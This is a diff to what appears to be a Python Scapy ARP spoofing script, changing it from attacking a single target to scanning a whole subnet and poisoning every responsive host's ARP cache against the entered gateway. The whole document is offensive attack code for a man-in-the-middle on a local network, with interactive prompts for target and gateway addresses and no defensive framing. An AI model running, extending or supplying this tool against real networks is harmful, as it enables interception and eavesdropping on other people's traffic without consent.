@@ -9,19 +9,20 @@ def restorearp(targetip, targetmac, sourceip, sourcemac):
 	send(packet, verbose=False)
 	print("ARP Table restored to normal for", targetip)
 
-def MultiSniffing():
+def MultiSniffing(ippasserelle):
 	ipt = {}
-	ip = ".".join(conf.route.route("0.0.0.0")[1].split(".")[:-1]) + "."
-	for num in range(1, 254):
+	ip = ".".join(ippasserelle.split(".")[:-1]) + "."
+	for num in range(1, 255):
 		if str(arping(ip + str(num))[0])[-2] != "0":
 			ipt[ip + str(num)] = getmacbyip(ip + str(num))
+			SingleSniffing(ip + str(num), ippasserelle)
 	print(ipt)
 
 
 def SingleSniffing(targetip, passerelleip):
 	if str(arping(targetip)[0])[-2] != "0" :
 		targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
-		gatewayip = passerelleip#conf.route.route(targetip)[2]
+		gatewayip = passerelleip
 		gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
 		try:
 			print("Sending spoofed ARP responses")
@@ -36,6 +37,13 @@ def SingleSniffing(targetip, passerelleip):
 	else:
 		print("Ip not reachable")
 
-iptarget = input("Which ip target :")
-ippasserelle = input("Which ip passerelle :")
-SingleSniffing(iptarget, ippasserelle)
+if input("Multiple or Single ? [M or S]") != "M":
+	iptarget = input("Which ip target :")
+	ippasserelle = input("Which ip passerelle :")
+	SingleSniffing(iptarget, ippasserelle)
+else : 
+    ippasserelle = input("Which ip passerelle :")
+    MultiSniffing(ippasserelle)
+    
+    
+
